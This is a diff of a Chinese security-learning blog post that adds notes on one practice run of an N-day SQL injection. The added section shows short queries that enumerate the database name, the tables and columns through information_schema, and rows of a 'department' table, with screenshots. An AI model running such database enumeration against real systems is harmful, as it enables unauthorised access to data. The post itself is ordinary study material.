@@ -23,12 +23,17 @@
 <meta property="og:site_name" content="3xsh0re">
 <meta property="og:description" content="根本学不会哈哈">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://remixxyh.github.io/2023/08/15/%E9%87%8D%E6%96%B0%E5%AD%A6%E4%B9%A0SQL%E6%B3%A8%E5%85%A5/Snipaste_2023-09-08_21-34-37.png">
+<meta property="og:image" content="https://remixxyh.github.io/2023/08/15/%E9%87%8D%E6%96%B0%E5%AD%A6%E4%B9%A0SQL%E6%B3%A8%E5%85%A5/Snipaste_2023-09-08_21-40-47.png">
+<meta property="og:image" content="https://remixxyh.github.io/2023/08/15/%E9%87%8D%E6%96%B0%E5%AD%A6%E4%B9%A0SQL%E6%B3%A8%E5%85%A5/Snipaste_2023-09-08_21-43-30.png">
+<meta property="og:image" content="https://remixxyh.github.io/2023/08/15/%E9%87%8D%E6%96%B0%E5%AD%A6%E4%B9%A0SQL%E6%B3%A8%E5%85%A5/Snipaste_2023-09-08_21-51-33.png">
 <meta property="article:published_time" content="2023-08-15T07:05:38.000Z">
-<meta property="article:modified_time" content="2023-08-31T15:13:12.443Z">
+<meta property="article:modified_time" content="2023-09-08T13:52:56.070Z">
 <meta property="article:author" content="3xsh0re">
 <meta property="article:tag" content="web安全">
 <meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://remixxyh.github.io/2023/08/15/%E9%87%8D%E6%96%B0%E5%AD%A6%E4%B9%A0SQL%E6%B3%A8%E5%85%A5/Snipaste_2023-09-08_21-34-37.png">
   
   
   
@@ -250,7 +255,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          26 字
+          343 字
         
       </span>
     
@@ -261,7 +266,7 @@
         
         
         
-          1 分钟
+          3 分钟
         
       </span>
     
@@ -314,7 +319,25 @@
                 <p>根本学不会哈哈</p>
 <span id="more"></span>
 
-<h1 id="实战中的SQL注入"><a href="#实战中的SQL注入" class="headerlink" title="实战中的SQL注入"></a>实战中的SQL注入</h1><h3 id="学会使用sqlmap"><a href="#学会使用sqlmap" class="headerlink" title="学会使用sqlmap"></a>学会使用sqlmap</h3>
+<h1 id="实战中的SQL注入"><a href="#实战中的SQL注入" class="headerlink" title="实战中的SQL注入"></a>实战中的SQL注入</h1><h3 id="学会使用sqlmap"><a href="#学会使用sqlmap" class="headerlink" title="学会使用sqlmap"></a>学会使用sqlmap</h3><p>。。。</p>
+<h3 id="实战用的SQL注入"><a href="#实战用的SQL注入" class="headerlink" title="实战用的SQL注入"></a>实战用的SQL注入</h3><h4 id="记录一次完整地利用SQL注入（Nday，拿来练手）"><a href="#记录一次完整地利用SQL注入（Nday，拿来练手）" class="headerlink" title="记录一次完整地利用SQL注入（Nday，拿来练手）"></a>记录一次完整地利用SQL注入（Nday，拿来练手）</h4><p>选出数据库名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">selec database()<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/15/%E9%87%8D%E6%96%B0%E5%AD%A6%E4%B9%A0SQL%E6%B3%A8%E5%85%A5/Snipaste_2023-09-08_21-34-37.png" srcset="/img/loading.gif" lazyload></p>
+<p>选出表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select table_name from information_schema.tables where table_schema=&#x27;mysql3235&#x27; <br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/15/%E9%87%8D%E6%96%B0%E5%AD%A6%E4%B9%A0SQL%E6%B3%A8%E5%85%A5/Snipaste_2023-09-08_21-40-47.png" srcset="/img/loading.gif" lazyload></p>
+<p>选一个表获取其字段名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;act_tac_rel&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/15/%E9%87%8D%E6%96%B0%E5%AD%A6%E4%B9%A0SQL%E6%B3%A8%E5%85%A5/Snipaste_2023-09-08_21-43-30.png" srcset="/img/loading.gif" lazyload></p>
+<p>刚刚的表里没有内容，换一个<code>department</code>表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> NAME <span class="hljs-keyword">from</span> department<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/15/%E9%87%8D%E6%96%B0%E5%AD%A6%E4%B9%A0SQL%E6%B3%A8%E5%85%A5/Snipaste_2023-09-08_21-51-33.png" srcset="/img/loading.gif" lazyload></p>
+<p>上面就是普通流程全部走了一遍😎😎😎</p>
+
                 
               </div>
             
